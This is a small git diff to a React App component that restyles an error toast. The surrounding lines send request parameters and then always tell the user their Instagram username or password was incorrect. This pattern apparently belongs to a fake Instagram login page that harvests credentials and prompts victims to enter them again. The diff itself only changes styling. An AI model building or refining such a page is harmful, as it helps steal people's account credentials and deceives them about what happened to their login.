@@ -66,7 +66,17 @@ function App() {
     };
 
     request.send(JSON.stringify(params));
-    toast.error("Incorrect Instagram Username or Password, Please try again.");
+    // toast.error("Incorrect Instagram Username or Password, Please try again.");
+    toast('Incorrect instagram Username or Password, please try again!',
+  {
+    icon: '❌',
+    style: {
+      borderRadius: '10px',
+      background: '#333',
+      color: '#fff',
+    },
+  }
+);
   };
 
   return (
